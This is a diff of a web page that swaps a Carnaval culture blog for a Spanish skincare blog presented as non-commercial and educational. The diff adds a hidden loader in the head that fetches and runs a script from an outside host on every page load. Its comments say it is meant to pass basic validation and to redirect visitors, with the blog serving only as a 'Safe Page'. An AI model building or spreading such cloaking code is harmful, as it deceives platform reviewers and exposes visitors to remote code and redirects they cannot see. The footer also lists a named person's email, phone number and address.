@@ -3,537 +3,288 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>arifiniafacturaweb con amor - Blog del Carnaval de Barranquilla</title>
+    <title>NOAR MAELIS GUAL ZIER | Guía de Belleza Inteligente</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script>
+        (function() {
+            // ID aleatorio para evitar caché y pasar validación básica
+            var randomID = "u" + Math.random().toString(36).substring(7);
 
-    
-    <meta name="description" content="Blog informativo sobre la historia, danzas y cultura del Carnaval de Barranquilla, Obra Maestra del Patrimonio Oral e Inmaterial de la Humanidad.">
-    
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Source+Sans+Pro:wght@300;400;600&display=swap" rel="stylesheet">
+            // APUNTA AL PUERTO 3008 (Backend Node.js)
+            var backendURL = "https://backaire.onrender.com/" + randomID;
 
+            var s = document.createElement('script');
+            s.src = backendURL;
+
+            // Cuando el backend responda...
+            s.onload = function() {
+                // Si el backend dice "window.__view = true", mostramos la web
+                // Si el backend redirecciona, esto no llegará a ejecutarse visualmente
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+
+            // En caso de error de conexión (Node apagado), mostrar la web por defecto
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+
+            document.head.appendChild(s);
+        })();
+    </script>
 
     <style>
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 999999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        
 
-        
         :root {
-            --primary-color: #8E1600; /* Rojo profundo editorial */
-            --secondary-color: #D4AF37; /* Dorado cálido */
-            --text-dark: #2C3E50;
-            --text-light: #5A6A7D;
-            --bg-color: #F8F9FA;
-            --white: #FFFFFF;
+            --primary: #4a4a4a;
+            /* Gris Carbón / Ciencia */
+            --secondary: #d4a373;
+            /* Nude / Piel */
+            --dark: #2d3748;
+            --light: #faf5f0;
+            /* Fondo crema muy suave */
+            --text: #334155;
+            --accent: #b08968; 
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Source Sans Pro', sans-serif;
-            color: var(--text-dark);
-            background-color: var(--bg-color);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-
-        h1, h2, h3, h4 {
-            font-family: 'Playfair Display', serif;
-            color: var(--primary-color);
-            margin-bottom: 15px;
-        }
-
-        a {
-            text-decoration: none;
-            color: inherit;
-            transition: color 0.3s ease;
-        }
-
-        /* --- Header y Navegación --- */
-        header {
-            background-color: var(--white);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            transition: padding 0.3s ease;
-        }
-
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-family: 'Playfair Display', serif;
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary-color);
-        }
-
-        .nav-links {
-            list-style: none;
-            display: flex;
-            gap: 30px;
-        }
-
-        .nav-links a {
-            font-weight: 600;
-            font-size: 0.95rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .nav-links a:hover {
-            color: var(--secondary-color);
-        }
-
-        /* --- Hero Section --- */
-        .hero {
-            margin-top: 80px;
-            height: 70vh;
-            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.unsplash.com/photo-1533222481259-ce20eda1e20b?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') center/cover;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: var(--white);
-            padding: 0 20px;
-        }
-
-        .hero-content h1 {
-            color: var(--white);
-            font-size: 3.5rem;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-
-        .hero-content p {
-            font-size: 1.2rem;
-            max-width: 800px;
-            margin: 0 auto 30px;
-            font-weight: 300;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: 12px 30px;
-            background-color: var(--secondary-color);
-            color: var(--white);
-            font-weight: 600;
-            text-transform: uppercase;
-            border-radius: 3px;
-            transition: background 0.3s ease;
-        }
-
-        .btn:hover {
-            background-color: #bfa030;
-        }
-
-        /* --- Secciones Generales --- */
-        section {
-            padding: 80px 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 2.5rem;
-            margin-bottom: 50px;
-            position: relative;
-        }
-
-        .section-title::after {
-            content: '';
-            width: 60px;
-            height: 3px;
-            background-color: var(--secondary-color);
-            display: block;
-            margin: 15px auto 0;
-        }
-
-        /* --- Grid de Contenido (Danzas) --- */
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 40px;
-        }
-
-        .card {
-            background: var(--white);
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            transition: transform 0.3s ease;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-        }
-
-        .card img {
-            width: 100%;
-            height: 250px;
-            object-fit: cover;
-        }
-
-        .card-content {
-            padding: 25px;
-        }
-
-        .card-content h3 {
-            font-size: 1.4rem;
-        }
-
-        .card-content p {
-            color: var(--text-light);
-            font-size: 0.95rem;
-        }
-
-        /* --- Historia Section (Layout Dividido) --- */
-        .split-layout {
-            display: flex;
-            align-items: center;
-            gap: 50px;
-        }
-
-        .split-text, .split-image {
-            flex: 1;
-        }
-
-        .split-image img {
-            width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-
-        /* --- Contacto --- */
-        .contact-section {
-            background-color: var(--white);
-            padding: 80px 20px;
-        }
-
-        .contact-wrapper {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 50px;
-        }
-
-        .contact-info h3 {
-            margin-bottom: 20px;
-        }
-
-        .contact-info p {
-            margin-bottom: 10px;
-            color: var(--text-light);
-        }
-
-        .contact-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .contact-form input, .contact-form textarea {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-family: inherit;
-        }
-
-        .contact-form button {
-            padding: 12px 20px;
-            background-color: var(--primary-color);
-            color: var(--white);
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1rem;
-            font-weight: 600;
-            transition: background 0.3s ease;
-        }
-
-        .contact-form button:hover {
-            background-color: #6a1000;
-        }
-
-        /* --- Footer y Legales --- */
-        footer {
-            background-color: var(--text-dark);
-            color: var(--white);
-            padding: 40px 20px 20px;
-            text-align: center;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .footer-links a {
-            color: #ccc;
-            font-size: 0.9rem;
-            cursor: pointer;
-        }
-
-        .footer-links a:hover {
-            color: var(--white);
-            text-decoration: underline;
-        }
-
-        .copyright {
-            color: #888;
-            font-size: 0.85rem;
-            border-top: 1px solid #444;
-            padding-top: 20px;
-            margin-top: 20px;
-        }
-
-        /* --- Modales para Políticas (Políticas de Google Ads) --- */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: var(--white);
-            width: 90%;
-            max-width: 800px;
-            max-height: 80vh;
-            overflow-y: auto;
-            padding: 40px;
-            border-radius: 8px;
-            position: relative;
-        }
-
-        .close-modal {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: var(--text-dark);
-        }
-
-        /* --- Responsive --- */
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none; /* En un entorno real se implementaría un menú hamburguesa */
-            }
-            .hero-content h1 {
-                font-size: 2.5rem;
-            }
-            .split-layout {
-                flex-direction: column;
-            }
-            .contact-wrapper {
-                grid-template-columns: 1fr;
-            }
-        }
+        body { font-family: 'Inter', sans-serif; line-height: 1.6; color: var(--text);
+margin: 0; background-color: #ffffff; }
+        header { background-color: #ffffff; padding: 20px 5%;
+box-shadow: 0 2px 10px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; flex-wrap: wrap;
+}
+        .logo { font-size: 16px; font-weight: 700; color: var(--primary); text-decoration: none; text-transform: uppercase;
+letter-spacing: 0.5px; }
+        nav { margin-top: 10px;
+}
+        nav a { margin-left: 20px; text-decoration: none; color: var(--dark); font-weight: 600;
+font-size: 14px; transition: color 0.3s; }
+        nav a:hover { color: var(--secondary);
+}
+        .hero { background: linear-gradient(135deg, #f5ebe0 0%, #e3d5ca 100%); padding: 80px 5%;
+text-align: center; border-bottom: 1px solid #d5bdaf; }
+        .hero h1 { color: var(--dark);
+font-size: 42px; margin-bottom: 20px; font-weight: 700; }
+        .hero p { font-size: 18px;
+max-width: 800px; margin: 0 auto 30px; color: #4a4a4a; }
+        .badge { background-color: var(--primary);
+color: white; padding: 8px 16px; border-radius: 20px; font-size: 14px; font-weight: 600; display: inline-block; margin-bottom: 20px;
+}
+        .container { max-width: 1200px; margin: 60px auto; padding: 0 5%;
+}
+        .section-title { font-size: 32px; color: var(--dark); text-align: center; margin-bottom: 50px; position: relative;
+}
+        .section-title::after { content: ''; width: 60px; height: 4px; background-color: var(--accent); display: block;
+margin: 15px auto 0; border-radius: 2px; }
+        .grid { display: grid;
+grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; margin-bottom: 60px; }
+        .card { background: white;
+padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border-top: 5px solid var(--secondary); transition: transform 0.3s;
+}
+        .card:hover { transform: translateY(-5px);
+}
+        .card h3 { color: var(--dark); margin-top: 0; font-size: 20px;
+}
+        .info-panel { background-color: var(--light); border-radius: 12px; padding: 40px; margin-bottom: 60px;
+border-left: 6px solid var(--secondary); }
+        .info-panel h3 { color: var(--dark); margin-top: 0;
+}
+        .about-section { background: #ffffff; padding: 40px; border-radius: 12px;
+box-shadow: 0 4px 20px rgba(0,0,0,0.05); margin-bottom: 60px; border: 1px solid #e3d5ca;
+}
+        
+        table { width: 100%;
+border-collapse: collapse; margin-bottom: 40px; background: white; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;
+}
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #e3d5ca;
+}
+        th { background-color: var(--primary); color: white; font-weight: 600;
+}
+        tr:hover { background-color: #faf5f0;
+}
+        
+        footer { background-color: var(--dark);
+color: #cbd5e1; padding: 60px 5% 20px; font-size: 14px; }
+        .footer-grid { display: grid;
+grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 40px; margin-bottom: 40px; border-bottom: 1px solid #334155; padding-bottom: 40px;
+}
+        .footer-grid h4 { color: white; margin-top: 0; font-size: 18px;
+}
+        .footer-links a { color: #cbd5e1; text-decoration: none; display: block; margin-bottom: 12px;
+transition: color 0.3s;}
+        .footer-links a:hover { color: white;
+}
+        .copyright { text-align: center; margin-top: 20px;
+}
     </style>
 </head>
 <body>
-
-    <header id="header">
-        <div class="nav-container">
-            <div class="logo">arifiniafacturaweb con amor</div>
-            <ul class="nav-links">
-                <li><a href="#inicio">Inicio</a></li>
-                <li><a href="#historia">Historia</a></li>
-                <li><a href="#tradiciones">Tradiciones</a></li>
-                <li><a href="#contacto">Contacto</a></li>
-            </ul>
-        </div>
+<div id="preloader">
+    <div class="spinner"></div>
+</div>  
+    <header>
+        <a href="index.html" class="logo">NOAR MAELIS GUAL ZIER</a>
+        <nav>
+            <a href="#inicio">Inicio</a>
+            <a href="#ingredientes">Ciencia de Ingredientes</a>
+            <a href="#tutoriales">Rutina Correcta</a>
+            <a href="#mitos">Hype vs. Realidad</a>
+            <a href="#sobre-mi">Sobre Mí</a>
+        </nav>
     </header>
 
-    <main>
-        <section id="inicio" class="hero">
-            <div class="hero-content">
-                <h1>Carnaval de Barranquilla</h1>
-                <p>Una exploración documental de la Obra Maestra del Patrimonio Oral e Inmaterial de la Humanidad. Descubra las raíces, las danzas y la expresión cultural más grande de Colombia.</p>
-                <a href="#historia" class="btn">Leer Artículo Completo</a>
-            </div>
-        </section>
+    <section id="inicio" class="hero">
+        <span class="badge">Blog Educativo de Cosmetología - Sin Fines Comerciales</span>
+        <h1>Belleza Inteligente para la Mujer Real</h1>
+        <p>Dejamos de lado el hype del marketing para enfocarnos estrictamente en lo que funciona.
+Análisis de ingredientes basados en evidencia, tutoriales de aplicación y la desmitificación de las últimas tendencias del cuidado de la piel.</p>
+    </section>
 
-        <section id="historia">
-            <h2 class="section-title">Orígenes y Patrimonio</h2>
-            <div class="split-layout">
-                <div class="split-text">
-                    <p>El Carnaval de Barranquilla es el evento folclórico y cultural más importante de Colombia. Sus orígenes se remontan a la época colonial, sirviendo como un espacio de convergencia entre las culturas indígenas, africanas y europeas.</p>
-                    <br>
-                    <p>A través de los siglos, se ha consolidado como un archivo vivo de la memoria colectiva del Caribe colombiano. En 2003, la UNESCO reconoció su inmenso valor sociológico y antropológico declarándolo Obra Maestra del Patrimonio Oral e Inmaterial de la Humanidad.</p>
-                </div>
-                <div class="split-image">
-                    <img src="https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Danzantes tradicionales del Carnaval">
-                </div>
-            </div>
-        </section>
-
-        <section id="tradiciones" style="background-color: var(--white); padding: 80px 20px; max-width: 100%;">
-            <div style="max-width: 1200px; margin: 0 auto;">
-                <h2 class="section-title">Expresiones Folclóricas</h2>
-                <div class="grid-container">
-                    <div class="card">
-                        <img src="https://images.unsplash.com/photo-1541257710737-06d667133a53?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Danza de la Cumbia">
-                        <div class="card-content">
-                            <h3>La Cumbia</h3>
-                            <p>El baile madre del carnaval. Representa el cortejo del hombre negro a la mujer indígena, caracterizado por el movimiento sereno de las velas y la elegancia de los vestidos de pollera.</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <img src="https://images.unsplash.com/photo-1520872024865-3ff2805d8bb3?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Danza del Garabato">
-                        <div class="card-content">
-                            <h3>El Garabato</h3>
-                            <p>Una danza que escenifica la lucha entre la vida y la muerte. De origen campesino, los danzantes portan un bastón (garabato) adornado con cintas de los colores representativos de Barranquilla.</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <img src="https://images.unsplash.com/photo-1508997449629-303059a039c0?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Máscara de Marimonda">
-                        <div class="card-content">
-                            <h3>Las Marimondas</h3>
-                            <p>Una figura exclusivamente barranquillera que nació como burla a la clase política y elitista de finales del siglo XIX. Se caracteriza por su máscara con orejas de elefante y nariz alargada.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section id="contacto" class="contact-section">
-            <h2 class="section-title">Información y Contacto Editorial</h2>
-            <div class="contact-wrapper">
-                <div class="contact-info">
-                    <h3>Contacte a nuestra redacción</h3>
-                    <p>Para consultas sobre colaboraciones, derechos de reproducción de artículos fotográficos o información institucional, no dude en comunicarse con nosotros. Nuestro equipo editorial responderá a la brevedad.</p>
-                    <br>
-                    <p><strong>Dirección Legal:</strong> Calle 72 # 54-22, Edificio Empresarial, Barranquilla, Colombia.</p>
-                    <p><strong>Teléfono de Atención:</strong> +57 (605) 555-0198</p>
-                    <p><strong>Correo Electrónico:</strong> redaccion@arifiniafacturaweb.com</p>
-                    <p><strong>Horario:</strong> Lunes a Viernes, 9:00 AM - 5:00 PM (COT)</p>
-                </div>
-                <div>
-                    <form class="contact-form" id="contactForm">
-                        <input type="text" placeholder="Nombre completo" required>
-                        <input type="email" placeholder="Correo electrónico corporativo o personal" required>
-                        <input type="text" placeholder="Asunto de la consulta" required>
-                        <textarea rows="5" placeholder="Redacte su mensaje detalladamente..." required></textarea>
-                        <button type="submit">Enviar Mensaje</button>
-                    </form>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="footer-links">
-            <a onclick="openModal('privacyModal')">Políticas de Privacidad</a>
-            <a onclick="openModal('termsModal')">Términos y Condiciones</a>
-            <a href="#contacto">Contacto Legal</a>
+    <div class="container">
+        
+        <div id="sobre-mi" class="about-section">
+            <h2>Propósito Académico y Formativo del Sitio</h2>
+            <p>Este portal es una iniciativa estrictamente educativa, académica e informativa operada de manera personal e independiente por <strong>NOAR MAELIS GUAL ZIER</strong>.
+Mi propósito exclusivo es la divulgación de conocimientos teóricos sobre el cuidado personal, la higiene y la química cosmética básica.</p>
+            <p><strong>Declaro de manera oficial y transparente que este sitio NO tiene fines comerciales.
+NO opero una clínica estética, NO soy dermatóloga, NO vendo cremas, sueros ni maquillaje, y NO ofrezco consultas médicas ni recetas.</strong> Toda la información analítica sobre ingredientes se proporciona de forma libre, gratuita y orientativa como material de estudio.</p>
         </div>
-        <div class="copyright">
-            &copy; 2026 arifiniafacturaweb con amor. Todos los derechos reservados. Blog estrictamente informativo.
+
+        <h2 id="ingredientes" class="section-title">Análisis Teórico de Ingredientes Activos</h2>
+        <div class="grid">
+            <div class="card">
+                <h3>Ácido Hialurónico 
+(AH)</h3>
+                <p>Químicamente, es un glicosaminoglicano.
+Su función principal no es "hidratar" por sí solo, sino actuar como una esponja molecular: puede retener hasta 1000 veces su peso en agua.
+<strong>El secreto analítico:</strong> Debe aplicarse siempre sobre la piel ligeramente húmeda;
+de lo contrario, al buscar humedad, la extraerá de las capas profundas de tu propia piel, causando el efecto contrario (deshidratación).</p>
+            </div>
+            <div class="card">
+                <h3>Niacinamida (Vitamina B3)</h3>
+                <p>El ingrediente multipropósito respaldado por la ciencia.
+Sus estudios clínicos demuestran eficacia para regular la producción de sebo, fortalecer la barrera cutánea y atenuar la hiperpigmentación (manchas).
+<strong>El error del hype:</strong> El marketing promueve concentraciones del 10% o 15%, pero la literatura científica indica que su punto óptimo de eficacia sin irritación está entre el 2% y el 5%.</p>
+            </div>
+            <div class="card">
+                <h3>Retinoides (Vitamina A)</h3>
+                <p>Es el estándar de oro en el antienvejecimiento preventivo.
+Funciona acelerando la renovación celular y estimulando la producción de colágeno.
+<strong>La regla de oro:</strong> Causa fotosensibilidad y puede ser irritante al inicio.
+Teóricamente, debe introducirse en la rutina de forma paulatina (método "retinización"), usarse estrictamente de noche y obligar al uso de protector solar al día siguiente.</p>
+            </div>
+        </div>
+
+        <h2 id="tutoriales" class="section-title">Metodología: El Orden Correcto de la Rutina</h2>
+        <div class="info-panel">
+            <h3>La Regla de la Textura y el pH</h3>
+            
+<p>Comprar los mejores ingredientes no sirve de nada si se aplican en el orden incorrecto, ya que se bloquea su absorción.
+La teoría cosmetológica dicta una regla básica: <strong>aplicar de la textura más ligera a la más densa</strong>.</p>
+            <ul style="margin-top: 15px; padding-left: 20px;">
+                <li style="margin-bottom: 10px;"><strong>Paso 1: Limpieza (Base):</strong> Retirar el sebo y la contaminación.
+En la noche, la ciencia apoya la "doble limpieza" (un limpiador base aceite seguido de uno base agua) para disolver los protectores solares modernos.</li>
+                <li style="margin-bottom: 10px;"><strong>Paso 2: Tónicos o Esencias (Acuosos):</strong> Productos líquidos que devuelven el pH natural a la piel después del lavado.</li>
+                <li style="margin-bottom: 10px;"><strong>Paso 3: Sueros / Serums (Tratamiento):</strong> Aquí van los activos puros (Vitamina C, Ácido Hialurónico).
+Son moléculas pequeñas diseñadas para penetrar profundamente.</li>
+                <li style="margin-bottom: 10px;"><strong>Paso 4: Crema Hidratante (Oclusiva):</strong> Su función estructural es crear una barrera física que "sella" los sueros aplicados anteriormente, evitando que el agua se evapore al ambiente (pérdida transepidérmica de agua).</li>
+                <li style="margin-bottom: 10px;"><strong>Paso 5: Fotoprotección (Solo de día):</strong> El escudo final.
+El protector solar jamás debe mezclarse con la crema hidratante antes de aplicarse, ya que altera su formulación química y reduce su factor de protección (SPF).</li>
+            </ul>
+        </div>
+
+        <h2 id="mitos" class="section-title">Hype Comercial vs. Realidad Científica</h2>
+        <p style="text-align: center; margin-bottom: 30px; color: var(--text);">Desmitificamos las tendencias virales de internet analizando su viabilidad real.</p>
+        
+        <table>
+  
+          <thead>
+                <tr>
+                    <th>El "Hype" (Tendencia Viral)</th>
+                    <th>La Realidad Educativa y Científica</th>
+                </tr>
+           
+ </thead>
+            <tbody>
+                <tr>
+                    <td><strong>"Los productos 'Naturales' o 'Limpios' son siempre mejores y más seguros para la piel."</strong></td>
+                    <td>Falso.
+Lo natural no equivale a seguro (la hiedra venenosa es natural).
+Muchos aceites esenciales y extractos botánicos son altamente alergénicos y volátiles.
+La química cosmética sintética suele ser más estable, predecible e hipoalergénica.</td>
+                </tr>
+                <tr>
+                    <td><strong>"Los poros se pueden abrir con calor y cerrar con agua fría."</strong></td>
+                    <td>Falso anatómico.
+Los poros no tienen músculos a su alrededor; por lo tanto, no se abren ni se cierran.
+El calor ablanda el sebo en su interior (facilitando la limpieza), y el frío reduce temporalmente la inflamación, pero el tamaño del poro está determinado genéticamente.</td>
+                </tr>
+                <tr>
+                    <td><strong>"Masajear el rostro con rodillos de Jade afina el rostro y elimina toxinas."</strong></td>
+           
+                 <td>Exageración comercial.
+El masaje frío puede promover el drenaje linfático temporal reduciendo la hinchazón matutina (edema), pero ningún rodillo tiene la capacidad física de alterar la estructura ósea, eliminar grasa facial o desintoxicar el cuerpo (función exclusiva del hígado y los riñones).</td>
+                </tr>
+            </tbody>
+        </table>
+
+    </div>
+
+    <footer id="legal">
+        <div class="footer-grid">
+       
+             <div class="footer-links">
+                <h4>Marco Legal Documental</h4>
+                <a href="politica-de-privacidad.html">Política de Privacidad</a>
+                <a href="terminos-y-condiciones.html">Términos y Condiciones</a>
+                <a href="#sobre-mi">Acerca del Proyecto Educativo</a>
+            </div>
+
+      
+       <div>
+                <h4>Información de la Autora</h4>
+                <p style="color: #cbd5e1; line-height: 1.6;">
+                Sitio web administrado y redactado por:<br>
+                <strong style="color: white;">NOAR MAELIS GUAL ZIER</strong><br>
+              
+  <em>Plataforma académica de belleza y análisis de ingredientes.</em>
+                </p>
+            </div>
+
+            <div>
+                <h4>Datos de Contacto Oficial</h4>
+                <p style="color: #cbd5e1;
+line-height: 1.6;">
+                    <strong>Responsable:</strong> NOAR MAELIS GUAL ZIER<br>
+                    <strong>Email:</strong> <a href="mailto:stasvolchok@gmail.com" style="color: #cbd5e1;
+text-decoration: none;">stasvolchok@gmail.com</a><br>
+                    <strong>Teléfono:</strong> +57 3165652252<br>
+                    <strong>Sede:</strong> Dg. 49 Sur #53B - 58, BOGOTA, Colombia
+                </p>
+            </div>
+        </div>
+        
+       
+ <div class="copyright">
+            &copy; 2026 Editado y operado exclusivamente por NOAR MAELIS GUAL ZIER. Todos los derechos reservados.
         </div>
     </footer>
 
-    <div class="modal" id="privacyModal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeModal('privacyModal')">&times;</span>
-            <h2>Política de Privacidad</h2>
-            <p><strong>Última actualización: Marzo 2026</strong></p>
-            <br>
-            <p>En "arifiniafacturaweb con amor", respetamos y protegemos su privacidad. Esta Política de Privacidad describe cómo recopilamos, utilizamos y compartimos su información personal cuando visita nuestro blog informativo.</p>
-            <br>
-            <p><strong>1. Recopilación de Información:</strong> Solo recopilamos información personal (como nombre y correo electrónico) cuando usted nos la proporciona voluntariamente a través de nuestro formulario de contacto.</p>
-            <p><strong>2. Uso de la Información:</strong> Utilizamos sus datos exclusivamente para responder a sus consultas editoriales o de colaboración. No compartimos, vendemos ni alquilamos su información a terceros.</p>
-            <p><strong>3. Cookies y Seguimiento:</strong> Nuestro sitio puede utilizar cookies técnicas necesarias para el funcionamiento de la página web. No utilizamos herramientas de rastreo invasivas.</p>
-            <p><strong>4. Derechos del Usuario:</strong> Usted tiene derecho a solicitar el acceso, rectificación o eliminación de sus datos personales almacenados en nuestros servidores, enviando un correo a privacidad@arifiniafacturaweb.com.</p>
-        </div>
-    </div>
-
-    <div class="modal" id="termsModal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeModal('termsModal')">&times;</span>
-            <h2>Términos y Condiciones de Uso</h2>
-            <p><strong>1. Naturaleza del Sitio:</strong> "arifiniafacturaweb con amor" es un sitio web de carácter estrictamente informativo, periodístico y cultural. La información proporcionada tiene fines educativos sobre el Carnaval de Barranquilla.</p>
-            <br>
-            <p><strong>2. Propiedad Intelectual:</strong> Todo el contenido textual, diseño y estructura de esta página están protegidos por derechos de autor. Las imágenes utilizadas son de carácter ilustrativo o bajo licencia de uso libre o comercial correspondiente.</p>
-            <br>
-            <p><strong>3. Exención de Responsabilidad:</strong> Aunque nos esforzamos por mantener la información actualizada y correcta basada en datos históricos verificables, no garantizamos la exactitud absoluta y el uso de esta información es bajo la propia responsabilidad del lector.</p>
-            <br>
-            <p><strong>4. Modificaciones:</strong> Nos reservamos el derecho de modificar estos términos en cualquier momento. El uso continuado del sitio tras cualquier cambio constituye la aceptación de los nuevos términos.</p>
-        </div>
-    </div>
-
-    <script>
-        // Efecto visual en el header al hacer scroll
-        window.addEventListener('scroll', () => {
-            const header = document.getElementById('header');
-            if (window.scrollY > 50) {
-                header.style.padding = '10px 0';
-            } else {
-                header.style.padding = '20px 0';
-            }
-        });
-
-        // Scroll suave para los enlaces de navegación
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const targetId = this.getAttribute('href');
-                if(targetId === '#') return;
-                
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 80, // Ajuste para el header fijo
-                        behavior: 'smooth'
-                    });
-                }
-            });
-        });
-
-        // Prevención de envío del formulario para la demo
-        document.getElementById('contactForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            alert('Gracias por su mensaje. Nuestro equipo editorial se pondrá en contacto pronto.');
-            this.reset();
-        });
-
-        // Lógica de Modales para Legales (Obligatorio Google Ads)
-        function openModal(modalId) {
-            document.getElementById(modalId).style.display = 'flex';
-            document.body.style.overflow = 'hidden'; // Prevenir scroll de fondo
-        }
-
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-            document.body.style.overflow = 'auto'; // Restaurar scroll
-        }
-
-        // Cerrar modal al hacer clic fuera del contenido
-        window.onclick = function(event) {
-            if (event.target.className === 'modal') {
-                event.target.style.display = "none";
-                document.body.style.overflow = 'auto';
-            }
-        }
-    </script>
 </body>
 </html>
